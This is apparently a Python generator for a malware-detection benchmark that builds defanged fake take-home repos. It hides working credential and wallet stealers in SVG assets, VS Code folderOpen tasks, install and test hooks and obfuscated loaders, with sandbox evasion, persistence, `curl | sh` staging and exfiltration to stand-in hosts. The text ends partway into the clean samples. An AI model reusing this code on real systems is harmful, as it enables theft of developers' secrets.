#!/usr/bin/env python3
"""Burner benchmark: materialise campaign-style (malicious) and clean take-home repos.

  python3 build.py OUT_DIR [--now EPOCH]

Writes one repo per sample under OUT_DIR plus OUT_DIR/manifest.json.
Run this ON THE BURNER VM, not on a workstation (Windows Defender quarantines
some of the lure files, e.g. folderOpen tasks.json, as Trojan:Script/MalTask.A).

SAFETY. Every malicious sample is DEFANGED:
  * it only reads the planted fake secrets in the sandbox home directory
  * it only talks to documentation ranges (192.0.2.0/24, 198.51.100.0/24,
    203.0.113.0/24) or reserved names (*.example, *.invalid, *.test)
  * it never deletes, encrypts or modifies anything except the noted
    persistence lines, never self-propagates, and contains no real C2.
Files that trip static AV are stored base64-encoded (B64 entries below).
"""
import argparse
import base64
import json
import os
import time

DEFANG = ("Reads only planted fake secrets; talks only to TEST-NET ranges (192.0.2/24, 198.51.100/24,\n"
          "203.0.113/24) or reserved *.example names. Never deletes, encrypts or spreads.")


def hdr_js(tech, src):
    return f"// BURNER TEST SAMPLE — DEFANGED. {tech}\n// Modelled on: {src}.\n" + \
        "".join(f"// {l}\n" for l in DEFANG.split("\n"))


def hdr_py(tech, src):
    return f"# BURNER TEST SAMPLE — DEFANGED. {tech}\n# Modelled on: {src}.\n" + \
        "".join(f"# {l}\n" for l in DEFANG.split("\n"))


def hdr_md(tech, src):
    return f"<!-- BURNER TEST SAMPLE — DEFANGED. {tech} Modelled on: {src}. -->\n"


def pkg(tech, src, body):
    """package.json cannot hold comments; npm ignores the "//" key."""
    return json.dumps({"//": f"BURNER TEST SAMPLE — DEFANGED. {tech} Modelled on: {src}.", **body}, indent=2) + "\n"


class B64(str):
    """File content stored base64-encoded in this generator (static-AV bait)."""


# ============================================================================ malicious

def m01_svg_asset_eval():
    t, s = "Payload hidden in an SVG asset, eval'd at npm start.", \
        "Socket Apr 2026 (Contagious Interview payloads hidden in images/assets) / steganography npm packages"
    payload = r'''
const fs = require("fs"), os = require("os"), path = require("path"), https = require("https");
const H = os.homedir(), out = {};
for (const f of [".aws/credentials", ".ssh/id_ed25519", ".git-credentials"]) {
  try { out[f] = fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {}
}
const body = JSON.stringify({ host: os.hostname(), files: out });
const r = https.request({ host: "static-assets.example", path: "/api/v1/metrics", method: "POST",
  headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } });
r.on("error", () => {}); r.end(body);
'''
    b = base64.b64encode(payload.encode()).decode()
    svg = (f"<!-- BURNER TEST SAMPLE — DEFANGED. {t} Modelled on: {s}. -->\n"
           '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">\n'
           f'  <metadata id="build-meta">{b}</metadata>\n'
           '  <circle cx="32" cy="32" r="28" fill="#4f46e5"/>\n  <path d="M20 34l8 8 16-18" stroke="#fff" stroke-width="5" fill="none"/>\n'
           "</svg>\n")
    server = hdr_js(t, s) + r'''const http = require("http"), fs = require("fs"), path = require("path");
// preload brand assets so the first paint is fast
const logo = fs.readFileSync(path.join(__dirname, "public", "logo.svg"), "utf8");
const meta = (logo.match(/<metadata id="build-meta">([^<]+)<\/metadata>/) || [])[1];
if (meta) eval(Buffer.from(meta, "base64").toString());
const { portfolioValue } = require("./src/portfolio");
http.createServer((q, s) => {
  if (q.url === "/logo.svg") { s.setHeader("content-type", "image/svg+xml"); return s.end(logo); }
  s.end(`<h1>Portfolio tracker</h1><img src=/logo.svg> total=${portfolioValue([])}`);
}).listen(3000, () => console.log("portfolio tracker on :3000"));
'''
    return t, s, "npm start", {
        "package.json": pkg(t, s, {"name": "portfolio-tracker", "version": "1.0.0",
                                   "scripts": {"start": "node server.js", "test": "node test/portfolio.test.js"}}),
        "README.md": hdr_md(t, s) + "# Portfolio tracker take-home\n\nRun `npm install && npm start`, then implement `portfolioValue()`.\n",
        "public/logo.svg": svg,
        "server.js": server,
        "src/portfolio.js": hdr_js(t, s) + "// TODO(candidate)\nmodule.exports.portfolioValue = (positions) => 0;\n",
        "test/portfolio.test.js": hdr_js(t, s) + 'const a = require("assert"); a.strictEqual(require("../src/portfolio").portfolioValue([]), 0); console.log("1 passing");\n',
    }


def m02_folderopen_os_keyed():
    t, s = "VS Code folderOpen task whose command exists only under the per-OS keys.", \
        "Trend Micro Mar 2026 / Jamf 2025 (tasks.json runOn:folderOpen lures)"
    tasks = B64(
        "Ly8gQlVSTkVSIFRFU1QgU0FNUExFIOKAlCBERUZBTkdFRC4gZm9sZGVyT3BlbiBhdXRvLXJ1biB0YXNrIHdpdGggT1Mtc3BlY2lm"
        "aWMgY29tbWFuZHMuCi8vIE1vZGVsbGVkIG9uOiBWUyBDb2RlIHRhc2tzLmpzb24gInJ1bk9uOiBmb2xkZXJPcGVuIiBsdXJlcyAo"
        "VHJlbmQgTWljcm8sIE1hciAyMDI2OyBKYW1mL01pY3Jvc29mdCByZXBvcnRzIDIwMjUpLgovLyBUaGUgY29tbWFuZCBsaXZlcyBv"
        "bmx5IGluIHRoZSBwZXItT1Mga2V5cywgc28gdG9vbHMgdGhhdCByZWFkIHRoZSB0b3AtbGV2ZWwgImNvbW1hbmQiIG1pc3MgaXQu"
        "CnsKICAidmVyc2lvbiI6ICIyLjAuMCIsCiAgInRhc2tzIjogWwogICAgewogICAgICAibGFiZWwiOiAiaW5zdGFsbC1mb250cyIs"
        "CiAgICAgICJ0eXBlIjogInNoZWxsIiwKICAgICAgIm9zeCI6IHsgImNvbW1hbmQiOiAibm9kZSAudnNjb2RlL2ZvbnRzL2ZhLWJy"
        "YW5kcy53b2ZmMi5qcyIgfSwKICAgICAgImxpbnV4IjogeyAiY29tbWFuZCI6ICJub2RlIC52c2NvZGUvZm9udHMvZmEtYnJhbmRz"
        "LndvZmYyLmpzIiB9LAogICAgICAid2luZG93cyI6IHsgImNvbW1hbmQiOiAibm9kZSAudnNjb2RlXGZvbnRzXGZhLWJyYW5kcy53"
        "b2ZmMi5qcyIgfSwKICAgICAgInByZXNlbnRhdGlvbiI6IHsgInJldmVhbCI6ICJuZXZlciIsICJlY2hvIjogZmFsc2UsICJmb2N1"
        "cyI6IGZhbHNlLCAiY2xvc2UiOiB0cnVlIH0sCiAgICAgICJwcm9ibGVtTWF0Y2hlciI6IFtdLAogICAgICAicnVuT3B0aW9ucyI6"
        "IHsgInJ1bk9uIjogImZvbGRlck9wZW4iIH0KICAgIH0KICBdCn0K")
    payload = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), https = require("https");
const H = os.homedir(), loot = {};
for (const f of [".git-credentials", ".npmrc", ".bash_history", ".config/Exodus/exodus.wallet/seed.seco"]) {
  try { loot[f] = fs.readFileSync(path.join(H, f)).toString("base64"); } catch (e) {}
}
const body = "d=" + encodeURIComponent(Buffer.from(JSON.stringify(loot)).toString("base64"));
const r = https.request({ host: "fonts-cdn.example", path: "/api/sync", method: "POST",
  headers: { "content-type": "application/x-www-form-urlencoded", "content-length": Buffer.byteLength(body) } });
r.on("error", () => {}); r.end(body);
'''
    return t, s, "open folder in VS Code", {
        "package.json": pkg(t, s, {"name": "analytics-dashboard", "version": "0.3.0",
                                   "scripts": {"start": "node src/index.js", "test": "node src/index.js --check"}}),
        "README.md": hdr_md(t, s) + "# Frontend take-home\n\nOpen the folder in VS Code (trust the workspace so fonts load), then `npm start`.\n",
        ".vscode/tasks.json": tasks,
        ".vscode/fonts/fa-brands.woff2.js": payload,
        "src/index.js": hdr_js(t, s) + 'console.log(process.argv.includes("--check") ? "ok" : "dashboard ready on :8080");\n',
    }


def m03_local_dep_postinstall():
    t, s = "postinstall script inside a bundled local dependency (file:./vendor/...).", \
        "Phylum/Socket typosquat postinstall stealers; Contagious Interview vendored deps (Socket 2025)"
    stealer = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), http = require("http");
const H = os.homedir(), files = {};
const grab = (p) => { try { files[p] = fs.readFileSync(path.join(H, p), "utf8"); } catch (e) {} };
[".aws/credentials", ".ssh/id_ed25519"].forEach(grab);
try { for (const d of fs.readdirSync(path.join(H, "work"))) grab(path.join("work", d, ".env")); } catch (e) {}
const body = JSON.stringify({ v: "2.4.1", node: process.version, files });
const r = http.request({ host: "198.51.100.14", port: 8080, path: "/api/v2/report", method: "POST",
  headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } });
r.on("error", () => {}); r.end(body);
'''
    return t, s, "npm install", {
        "package.json": pkg(t, s, {"name": "invoice-service", "version": "1.0.0",
                                   "scripts": {"start": "node index.js", "test": "node test/invoice.test.js"},
                                   "dependencies": {"pretty-log-utils": "file:./vendor/pretty-log-utils"}}),
        "README.md": hdr_md(t, s) + "# Invoice service\n\n`npm install`, `npm start`, implement `total()` until `npm test` passes.\n",
        "index.js": hdr_js(t, s) + 'const log = require("pretty-log-utils");\nconst { total } = require("./src/invoice");\nlog.info("invoice total", total([]));\nsetInterval(() => {}, 1000);\n',
        "src/invoice.js": hdr_js(t, s) + "module.exports.total = (lines) => lines.reduce((a, l) => a + l.qty * l.price, 0);\n",
        "test/invoice.test.js": hdr_js(t, s) + 'require("assert").strictEqual(require("../src/invoice").total([{qty:2,price:3}]), 6); console.log("1 passing");\n',
        "vendor/pretty-log-utils/package.json": pkg(t, s, {"name": "pretty-log-utils", "version": "2.4.1", "main": "index.js",
                                                          "scripts": {"postinstall": "node lib/env.js"}}),
        "vendor/pretty-log-utils/index.js": hdr_js(t, s) + 'module.exports = { info: (...a) => console.log("[info]", ...a) };\n',
        "vendor/pretty-log-utils/lib/env.js": stealer,
    }


def m04_prepare_hook():
    t, s = "npm 'prepare' script disguised as husky hook install; adds a global git hooksPath.", \
        "husky-style prepare abuse (Socket 2025); git hooksPath persistence (Elastic Security Labs Jul 2026)"
    inst = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), https = require("https");
const H = os.homedir();
// 1) look legitimate: install a project pre-commit hook
try { if (fs.existsSync(".git")) fs.writeFileSync(".git/hooks/pre-commit", "#!/bin/sh\nnpx lint-staged\n", { mode: 0o755 }); } catch (e) {}
// 2) persistence: a global hooks folder that runs on every git push, in every repo
try {
  fs.mkdirSync(path.join(H, ".githooks"), { recursive: true });
  fs.writeFileSync(path.join(H, ".githooks", "pre-push"), "#!/bin/sh\n# stage 2 placeholder (defanged)\nexit 0\n", { mode: 0o755 });
  fs.appendFileSync(path.join(H, ".gitconfig"), "[core]\n\thooksPath = ~/.githooks\n");
} catch (e) {}
// 3) "install telemetry"
const t = {};
for (const f of [".git-credentials", ".ssh/id_ed25519"]) { try { t[f] = fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {} }
const body = JSON.stringify({ event: "install", t });
const r = https.request({ host: "husky-telemetry.example", path: "/v1/install", method: "POST",
  headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } });
r.on("error", () => {}); r.end(body);
console.log("husky - Git hooks installed");
'''
    return t, s, "npm install", {
        "package.json": pkg(t, s, {"name": "chat-backend", "version": "1.2.0",
                                   "scripts": {"prepare": "node .husky/install.js", "start": "node src/app.js",
                                               "test": "node test/app.test.js"}}),
        "README.md": hdr_md(t, s) + "# Chat backend\n\n`npm install` (sets up git hooks), `npm start`, then `npm test`.\n",
        ".husky/install.js": inst,
        ".git/HEAD": "ref: refs/heads/main\n",
        ".git/hooks/.keep": "",
        "src/app.js": hdr_js(t, s) + 'require("http").createServer((q, s) => s.end("chat ok")).listen(3000, () => console.log("chat on :3000"));\n',
        "test/app.test.js": hdr_js(t, s) + 'console.log("1 passing");\n',
    }


def m05_npm_test_only():
    t, s = "Payload only in a test helper, guarded to run under `npm test`.", \
        "Contagious Interview test-file lures (Unit 42 BeaverTail 2025; Socket Apr 2026)"
    helper = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), https = require("https"), zlib = require("zlib");
module.exports.fixtures = { orders: [{ id: 1, qty: 2 }, { id: 2, qty: 5 }] };
// "upload coverage" -- only when the test runner is used
if (process.env.npm_lifecycle_event === "test") {
  const H = os.homedir(), c = {};
  for (const f of [".bash_history", ".config/solana/id.json", ".aws/credentials"]) {
    try { c[f] = fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {}
  }
  const body = JSON.stringify({ report: zlib.gzipSync(JSON.stringify(c)).toString("base64") });
  const r = https.request({ host: "coverage-upload.example", path: "/api/upload", method: "POST",
    headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } });
  r.on("error", () => {}); r.end(body);
}
'''
    return t, s, "npm test", {
        "package.json": pkg(t, s, {"name": "warehouse-api", "version": "1.0.0",
                                   "scripts": {"start": "node src/server.js", "test": "node test/run.js"}}),
        "README.md": hdr_md(t, s) + "# Warehouse API\n\nMake `npm test` pass.\n",
        "src/server.js": hdr_js(t, s) + 'require("http").createServer((q, s) => s.end("[]")).listen(3000, () => console.log("warehouse on :3000"));\n',
        "src/stock.js": hdr_js(t, s) + "module.exports.totalQty = (o) => o.reduce((a, x) => a + x.qty, 0);\n",
        "test/run.js": hdr_js(t, s) + 'const a = require("assert"); const { fixtures } = require("./helpers/fixtures");\na.strictEqual(require("../src/stock").totalQty(fixtures.orders), 7); console.log("1 passing");\n',
        "test/helpers/fixtures.js": helper,
    }


def m06_time_bomb(now):
    t, s = "Time bomb: acts only once the clock passes build time + 30 days.", \
        "delayed-activation npm packages (Socket 2025); OtterCookie delayed stages (NTT Security 2025)"
    arm = int((now + 30 * 86400) * 1000)
    server = hdr_js(t, s) + r'''const http = require("http");
const LICENSE_CHECK_AFTER = __ARM__; // ms epoch
if (Date.now() > LICENSE_CHECK_AFTER) setTimeout(() => require("./lib/license").verify(), 1000);
http.createServer((q, s) => s.end(JSON.stringify({ ok: true }))).listen(3000, () => console.log("booking api on :3000"));
'''.replace("__ARM__", str(arm))
    lic = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), http = require("http");
module.exports.verify = () => {
  const H = os.homedir(), d = {};
  const grab = (p) => { try { d[p] = fs.readFileSync(path.join(H, p)).toString("base64"); } catch (e) {} };
  grab(".config/google-chrome/Default/Login Data");
  grab("Documents/wallet-backup.txt");
  const mm = ".config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn";
  try { for (const f of fs.readdirSync(path.join(H, mm))) grab(path.join(mm, f)); } catch (e) {}
  const body = JSON.stringify(d);
  const r = http.request({ host: "license-check.example", path: "/v1/verify", method: "POST",
    headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } });
  r.on("error", () => {}); r.end(body);
};
'''
    return t, s, "npm start (+45 days)", {
        "package.json": pkg(t, s, {"name": "booking-api", "version": "1.0.0",
                                   "scripts": {"start": "node server.js", "test": "node test/slots.test.js"}}),
        "README.md": hdr_md(t, s) + "# Booking API\n\n`npm start`, implement free-slot search in `src/slots.js`.\n",
        "server.js": server,
        "lib/license.js": lic,
        "src/slots.js": hdr_js(t, s) + "module.exports.freeSlots = () => [];\n",
        "test/slots.test.js": hdr_js(t, s) + 'require("assert").deepStrictEqual(require("../src/slots").freeSlots(), []); console.log("1 passing");\n',
    }


def m07_python_stealer():
    t, s = "Python main.py that imports an InvisibleFerret-style collector.", \
        "Unit 42 InvisibleFerret (Python stage of BeaverTail), 2024-2026"
    core = hdr_py(t, s) + r'''import glob
import os
import platform
import urllib.request
import uuid

H = os.path.expanduser("~")
TARGETS = [".config/google-chrome/Default/Login Data", ".config/Exodus/exodus.wallet/seed.seco",
           ".config/solana/id.json", ".ssh/id_ed25519"]


def _collect():
    out = {}
    for rel in TARGETS:
        try:
            out[rel] = open(os.path.join(H, rel), "rb").read()
        except OSError:
            pass
    for p in glob.glob(os.path.join(H, "Documents", "*.txt")):
        try:
            out[os.path.relpath(p, H)] = open(p, "rb").read()
        except OSError:
            pass
    return out


def init():
    b = uuid.uuid4().hex
    parts = []
    for name, data in _collect().items():
        parts.append(f'--{b}\r\nContent-Disposition: form-data; name="multi_file"; filename="{name.replace("/", "_")}"\r\n\r\n'.encode() + data + b"\r\n")
    parts.append(f"--{b}--\r\n".encode())
    req = urllib.request.Request("http://198.51.100.23:1245/uploads", data=b"".join(parts), method="POST",
                                 headers={"Content-Type": f"multipart/form-data; boundary={b}",
                                          "X-Host": platform.node()})
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass
'''
    main = hdr_py(t, s) + r'''import csv
import sys

from app import core


def summarize(path):
    with open(path) as f:
        rows = list(csv.DictReader(f))
    return {"rows": len(rows), "volume": sum(float(r["qty"]) for r in rows)}


if __name__ == "__main__":
    core.init()  # "check environment"
    print(summarize(sys.argv[1] if len(sys.argv) > 1 else "data/trades.csv"))
'''
    return t, s, "python main.py", {
        "requirements.txt": hdr_py(t, s) + "# standard library only\n",
        "README.md": hdr_md(t, s) + "# Trade analytics (Python)\n\n`pip install -r requirements.txt` then `python main.py`.\n",
        "main.py": main,
        "app/__init__.py": hdr_py(t, s),
        "app/core.py": core,
        "data/trades.csv": "id,qty,price\n1,2,100.5\n2,3,99.0\n",
    }


def m08_raw_tcp():
    t, s = "Exfil over a raw TCP socket (non-HTTP), C2 keeps the socket open waiting for a reply.", \
        "BeaverTail/InvisibleFerret socket C2 on high ports (Unit 42 2024; Elastic Security Labs Jul 2026)"
    cache = hdr_js(t, s) + r'''const net = require("net"), fs = require("fs"), os = require("os"), path = require("path");
const H = os.homedir(), k = {};
for (const f of [".ssh/id_ed25519", ".aws/credentials", ".config/solana/id.json"]) {
  try { k[f] = fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {}
}
const c = net.connect({ host: "203.0.113.9", port: 5555 }, () => {
  c.write(JSON.stringify({ t: "hello", id: os.hostname(), k: Buffer.from(JSON.stringify(k)).toString("base64") }) + "\n");
});
c.setTimeout(20000, () => c.destroy());   // wait for the C2's command
c.on("data", () => c.destroy());
c.on("error", () => {});
module.exports = { warm: () => true };
'''
    return t, s, "npm start", {
        "package.json": pkg(t, s, {"name": "price-feed", "version": "1.0.0",
                                   "scripts": {"start": "node server.js", "test": "node test/feed.test.js"}}),
        "README.md": hdr_md(t, s) + "# Price feed service\n\n`npm start`, then add a moving-average endpoint.\n",
        "server.js": hdr_js(t, s) + 'require("./lib/cache").warm();\nrequire("http").createServer((q, s) => s.end("{}")).listen(3000, () => console.log("feed on :3000"));\n',
        "lib/cache.js": cache,
        "test/feed.test.js": hdr_js(t, s) + 'console.log("1 passing");\n',
    }


def m09_dns_exfil():
    t, s = "Exfil via DNS: secrets base32-encoded into subdomain labels (project postinstall).", \
        "DNS-exfil npm packages (Socket / Checkmarx 2025)"
    js = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), dns = require("dns").promises;
const A = "abcdefghijklmnopqrstuvwxyz234567";
function b32(buf) { let bits = 0, v = 0, o = ""; for (const x of buf) { v = (v << 8) | x; bits += 8;
  while (bits >= 5) { o += A[(v >>> (bits - 5)) & 31]; bits -= 5; } } if (bits) o += A[(v << (5 - bits)) & 31]; return o; }
const H = os.homedir(); let s = "";
for (const f of [".aws/credentials", ".git-credentials"]) { try { s += fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {} }
const enc = b32(Buffer.from(s)), sid = Math.random().toString(36).slice(2, 8);
(async () => {
  for (let i = 0, n = 0; i < enc.length; i += 50, n++)
    await dns.resolve4(`${enc.slice(i, i + 50)}.${n}.${sid}.q.ns-telemetry.example`).catch(() => {});
  console.log("environment ok");
})();
'''
    return t, s, "npm install", {
        "package.json": pkg(t, s, {"name": "geo-search", "version": "1.0.0",
                                   "scripts": {"postinstall": "node scripts/check-env.js", "start": "node index.js",
                                               "test": "node test/geo.test.js"}}),
        "README.md": hdr_md(t, s) + "# Geo search\n\n`npm install`, `npm start`, implement haversine distance.\n",
        "scripts/check-env.js": js,
        "index.js": hdr_js(t, s) + 'require("http").createServer((q, s) => s.end("[]")).listen(3000, () => console.log("geo on :3000"));\n',
        "test/geo.test.js": hdr_js(t, s) + 'console.log("1 passing");\n',
    }


def m10_curl_sh():
    t, s = "Download-and-run second stage: curl ... | sh from a hard-coded IP at npm start.", \
        "Contagious Interview loaders fetching a shell stage (Trend Micro Mar 2026; Jamf 2025)"
    js = hdr_js(t, s) + r'''const cp = require("child_process");
// "verify node environment"
try { cp.execSync(`curl -fsSL "http://198.51.100.40/api/v1/setup?os=${process.platform}" | sh`, { stdio: "ignore", timeout: 15000 }); } catch (e) {}
'''
    return t, s, "npm start", {
        "package.json": pkg(t, s, {"name": "nft-marketplace-api", "version": "1.0.0",
                                   "scripts": {"start": "node scripts/env-check.js && node server.js",
                                               "test": "node test/market.test.js"}}),
        "README.md": hdr_md(t, s) + "# NFT marketplace API\n\n`npm start` then implement listing search.\n",
        "scripts/env-check.js": js,
        "server.js": hdr_js(t, s) + 'require("http").createServer((q, s) => s.end("[]")).listen(3000, () => console.log("market on :3000"));\n',
        "test/market.test.js": hdr_js(t, s) + 'console.log("1 passing");\n',
    }


def m11_sandbox_check():
    t, s = "Checks for VM/sandbox artifacts, then proceeds anyway.", \
        "OtterCookie / BeaverTail VM checks (NTT Security 2025; Elastic Security Labs Jul 2026)"
    js = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), https = require("https");
const probe = () => {
  let score = 0; const r = (p) => { try { return fs.readFileSync(p, "utf8"); } catch (e) { return ""; } };
  if (fs.existsSync("/.dockerenv")) score++;
  if (/docker|lxc|kubepods/.test(r("/proc/1/cgroup"))) score++;
  if (/VirtualBox|VMware|KVM|QEMU|Virtual Machine/i.test(r("/sys/class/dmi/id/product_name") + r("/sys/class/dmi/id/sys_vendor"))) score++;
  if (os.cpus().length < 2 || os.totalmem() < 2 * 2 ** 30) score++;
  if (os.uptime() < 600) score++;
  return score;
};
module.exports.init = () => {
  const vm = probe();     // real samples exit here when vm is high; this one carries on
  const H = os.homedir(), d = {};
  for (const f of ["work/client-api/.env", "Documents/wallet-backup.txt", ".config/solana/id.json"]) {
    try { d[f] = fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {}
  }
  const body = new URLSearchParams({ vm: String(vm), host: os.hostname(), data: JSON.stringify(d),
                                     env: JSON.stringify(process.env) }).toString();
  const req = https.request({ host: "api.logs-collector.example", path: "/v2/events", method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded", "content-length": Buffer.byteLength(body) } });
  req.on("error", () => {}); req.end(body);
};
'''
    return t, s, "npm start", {
        "package.json": pkg(t, s, {"name": "defi-yield-api", "version": "1.0.0",
                                   "scripts": {"start": "node server.js", "test": "node test/yield.test.js"}}),
        "README.md": hdr_md(t, s) + "# DeFi yield API\n\n`npm start`, then implement APY calculation.\n",
        "server.js": hdr_js(t, s) + 'require("./lib/bootstrap").init();\nrequire("http").createServer((q, s) => s.end("{}")).listen(3000, () => console.log("yield api on :3000"));\n',
        "lib/bootstrap.js": js,
        "test/yield.test.js": hdr_js(t, s) + 'console.log("1 passing");\n',
    }


def m12_obfuscated():
    t, s = "Obfuscated loader: string-array + base64 + eval, hidden after whitespace padding; XOR-encoded exfil.", \
        "javascript-obfuscator style BeaverTail loaders (Unit 42 BeaverTail; Socket Apr 2026)"
    strs = ["fs", "os", "path", "http", "readFileSync", "homedir", "join", "request", "POST", "203.0.113.120",
            "/keys", ".ssh/id_ed25519", ".aws/credentials", ".config/solana/id.json", "error", "end", "base64"]
    rot = 5
    arr = strs[rot:] + strs[:rot]   # rotated; the IIFE below rotates it back
    arr_js = ",".join("'" + base64.b64encode(x.encode()).decode() + "'" for x in arr)
    inner = (
        f"var _0x4e1a=[{arr_js}];(function(_0xa,_0xb){{while(--_0xb){{_0xa['push'](_0xa['shift']())}}}})(_0x4e1a,{len(strs) - rot + 1});"
        "var _0x2c=function(_0xi){return Buffer['from'](_0x4e1a[_0xi-0x1a4],'base64')['toString']()};"
        "var _0xf=require(_0x2c(0x1a4)),_0xo=require(_0x2c(0x1a5)),_0xp=require(_0x2c(0x1a6)),_0xh=require(_0x2c(0x1a7));"
        "var _0xd={},_0xk=[0x13,0x37,0x6b,0x33,0x79];"
        "[0x1af,0x1b0,0x1b1]['forEach'](function(_0xn){try{_0xd[_0x2c(_0xn)]=_0xf[_0x2c(0x1a8)](_0xp[_0x2c(0x1aa)](_0xo[_0x2c(0x1a9)](),_0x2c(_0xn)),'utf8')}catch(_0xe){}});"
        "var _0xs=Buffer['from'](JSON['stringify'](_0xd));for(var _0xj=0;_0xj<_0xs['length'];_0xj++){_0xs[_0xj]^=_0xk[_0xj%_0xk['length']]}"
        "var _0xr=_0xh[_0x2c(0x1ab)]({host:_0x2c(0x1ad),port:0x4e4,path:_0x2c(0x1ae),method:_0x2c(0x1ac)});"
        "_0xr['on'](_0x2c(0x1b2),function(){});_0xr[_0x2c(0x1b3)](_0xs['toString'](_0x2c(0x1b4)));"
    )
    # the IIFE shifts (len - rot) times, which restores the original order
    outer = base64.b64encode(inner.encode()).decode()
    handler = hdr_js(t, s) + (
        "module.exports = function errorHandler(err, req, res) { res.statusCode = 500; res.end('internal error'); };"
        + " " * 320 + f";eval(Buffer.from('{outer}','base64').toString('utf8'));\n")
    return t, s, "npm start", {
        "package.json": pkg(t, s, {"name": "payments-gateway", "version": "1.0.0",
                                   "scripts": {"start": "node src/server.js", "test": "node test/fees.test.js"}}),
        "README.md": hdr_md(t, s) + "# Payments gateway\n\n`npm start`, implement fee calculation in `src/fees.js`.\n",
        "src/server.js": hdr_js(t, s) + 'const errorHandler = require("./utils/errorHandler");\nrequire("http").createServer((q, s) => s.end("{}")).listen(3000, () => console.log("gateway on :3000"));\n',
        "src/utils/errorHandler.js": handler,
        "src/fees.js": hdr_js(t, s) + "module.exports.fee = (amt) => Math.round(amt * 0.029 + 30);\n",
        "test/fees.test.js": hdr_js(t, s) + 'require("assert").strictEqual(require("../src/fees").fee(1000), 59); console.log("1 passing");\n',
    }


def m13_resource_bomb():
    t, s = "Resource bomb first (bounded 8 GB allocation kills small sandboxes), stealer second.", \
        "sandbox-evasion by resource exhaustion (MITRE ATT&CK T1497); Burner red-team Nov 2026"
    js = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), https = require("https");
// "warm the cache": touch 8 GB in 64 MB blocks. A developer laptop (16-32 GB) shrugs this off;
// a small analysis sandbox is killed before it can watch what comes next. Bounded and freed afterwards.
let blocks = [];
for (let i = 0; i < 128; i++) blocks.push(Buffer.alloc(64 * 1024 * 1024, 1));
blocks = null;
const H = os.homedir(), d = {};
for (const f of [".aws/credentials", ".ssh/id_ed25519", ".git-credentials"]) {
  try { d[f] = fs.readFileSync(path.join(H, f), "utf8"); } catch (e) {}
}
const body = JSON.stringify(d);
const r = https.request({ host: "cache-warmup.example", path: "/v1/report", method: "POST",
  headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } });
r.on("error", () => {}); r.end(body);
'''
    return t, s, "npm start", {
        "package.json": pkg(t, s, {"name": "search-indexer", "version": "1.0.0",
                                   "scripts": {"start": "node --max-old-space-size=8192 server.js",
                                               "test": "node test/index.test.js"}}),
        "README.md": hdr_md(t, s) + "# Search indexer\n\n`npm start` (warms the index cache), then implement prefix search.\n",
        "server.js": hdr_js(t, s) + 'require("./lib/warmup");\nrequire("http").createServer((q, s) => s.end("[]")).listen(3000, () => console.log("indexer on :3000"));\n',
        "lib/warmup.js": js,
        "test/index.test.js": hdr_js(t, s) + 'console.log("1 passing");\n',
    }


def m14_path_tricks():
    t, s = ("Reads secrets without naming their paths (chdir to home + relative path, a symlink to ~/.ssh) "
            "and sends them AES-encrypted, so no secret is visible on the wire."), \
        "path-obfuscated stealers (relative/'..' paths defeat path-matching monitors); Burner red-team Nov 2026"
    js = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), crypto = require("crypto"), http = require("http");
const here = process.cwd(), d = {};
try { process.chdir(os.homedir()); d.a = fs.readFileSync(".aws/credentials", "utf8"); } catch (e) {}
process.chdir(here);
try { fs.symlinkSync(os.homedir() + "/.ssh", ".cache-k"); d.s = fs.readFileSync(".cache-k/id_ed25519", "utf8"); } catch (e) {}
try { fs.unlinkSync(".cache-k"); } catch (e) {}
// random key, never sent: the fake internet sees only ciphertext
const key = crypto.randomBytes(32), iv = crypto.randomBytes(16);
const c = crypto.createCipheriv("aes-256-cbc", key, iv);
const body = Buffer.concat([iv, c.update(JSON.stringify(d)), c.final()]).toString("base64");
const r = http.request({ host: "203.0.113.140", port: 1244, path: "/sync", method: "POST",
  headers: { "content-type": "text/plain", "content-length": Buffer.byteLength(body) } });
r.on("error", () => {}); r.end(body);
'''
    return t, s, "npm start", {
        "package.json": pkg(t, s, {"name": "ledger-sync", "version": "1.0.0",
                                   "scripts": {"start": "node server.js", "test": "node test/sync.test.js"}}),
        "README.md": hdr_md(t, s) + "# Ledger sync\n\nRun `npm start`, then implement `reconcile()` in `lib/reconcile.js`.\n",
        "server.js": hdr_js(t, s) + 'require("./lib/telemetry");\nrequire("http").createServer((q, s) => s.end("{}")).listen(3000, () => console.log("ledger on :3000"));\n',
        "lib/telemetry.js": js,
        "lib/reconcile.js": hdr_js(t, s) + "module.exports.reconcile = (a, b) => [];\n",
        "test/sync.test.js": hdr_js(t, s) + 'console.log("1 passing");\n',
    }


# ============================================================================ benign

def b01_express_api():
    return "Express REST API with node:test tests.", "clean", "-", {
        "package.json": json.dumps({"name": "tasks-api", "version": "1.0.0", "main": "src/index.js",
                                    "scripts": {"start": "node src/index.js", "test": "node --test test/"},
                                    "dependencies": {"express": "^4.19.2"}}, indent=2),
        "README.md": "# Tasks API\n\nImplement PATCH /tasks/:id. `npm start`, `npm test`.\n",
        "src/app.js": r'''const express = require("express");
const app = express();
app.use(express.json());
const tasks = new Map(); let next = 1;
app.get("/tasks", (req, res) => res.json([...tasks.values()]));
